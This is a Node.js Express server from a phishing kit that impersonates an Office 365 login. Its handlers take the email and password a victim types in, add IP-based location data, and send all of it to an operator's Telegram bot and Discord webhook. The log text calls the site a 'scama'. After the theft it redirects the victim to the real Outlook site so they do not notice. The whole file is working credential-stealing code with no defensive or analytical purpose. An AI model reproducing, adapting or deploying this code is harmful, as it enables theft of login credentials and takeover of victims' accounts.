const express = require("express");
const bodyParser = require("body-parser");
const { EmbedBuilder, WebhookClient } = require("discord.js");
const XMLHttpRequest = require("xhr2");

const config = require("./module/config");
const con = require("./public/discord");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.set("view engine", "ejs");
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/second", (req, res) => {
  res.render("second");
});

app.post("/", (req, res) => {
  const getIp = function () {
    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then(function (data) {
        render(data);
      });
  };

  const render = function (data) {
    const my_text = `Result is:%0A => EMAIL: ${req.body.username} %0A %0A => PASSWORD: ${req.body.Passcode} %0A %0A => LOCATION: ${data.ip} visited your scama FROM ~ ${data.country_name} ~ ${data.city} ~ ${data.region} ${data.postal}`;

    // console.log(req.body.io, req.body.po)

    const url = `https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendMessage?chat_id=${config.TELEGRAM_CHAT_ID}&text=${my_text}`;

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    const embed = new EmbedBuilder()
      .setTitle("OFFICE365")
      .setDescription(
        `Result is:
    => EMAIL: ${req.body.username}
 
    => PASSWORD: ${req.body.Passcode}
    
    => LOCATION: ${data.ip} visited your scama FROM ~ ${data.country_name} ~ ${data.city} ~ ${data.region} ${data.postal}`
      )

      .setColor(0x00ffff);

    con.webhookClient.send({
      content: "OFFICE365",
      username: "OFFICE365 LOG",
      avatarURL: "https://i.imgur.com/AfFp7pu.png",
      embeds: [embed],
    });
  };

  getIp();
  res.render("second");
});

app.post("/second", (req, res) => {
  const getIp = function () {
    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then(function (data) {
        render(data);
      });
  };

  const render = function (data) {
    const my_text = `Result is:%0A => EMAIL: ${req.body.username} %0A %0A => PASSWORD: ${req.body.Passcode} %0A %0A => LOCATION: ${data.ip} visited your scama FROM ~ ${data.country_name} ~ ${data.city} ~ ${data.region} ${data.postal}`;

    // console.log(req.body.io, req.body.po)

    const url = `https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendMessage?chat_id=${config.TELEGRAM_CHAT_ID}&text=${my_text}`;

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    const embed = new EmbedBuilder()
      .setTitle("OFFICE365")
      .setDescription(
        `Result is:
     => EMAIL: ${req.body.username}
  
     => PASSWORD: ${req.body.Passcode}
     
     => LOCATION: ${data.ip} visited your scama FROM ~ ${data.country_name} ~ ${data.city} ~ ${data.region} ${data.postal}`
      )

      .setColor(0x00ffff);

    con.webhookClient.send({
      content: "OFFICE365",
      username: "OFFICE365 LOG",
      avatarURL: "https://i.imgur.com/AfFp7pu.png",
      embeds: [embed],
    });
  };

  getIp();
  res.redirect("https://outlook.office365.com/mail/");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("server listening");
});
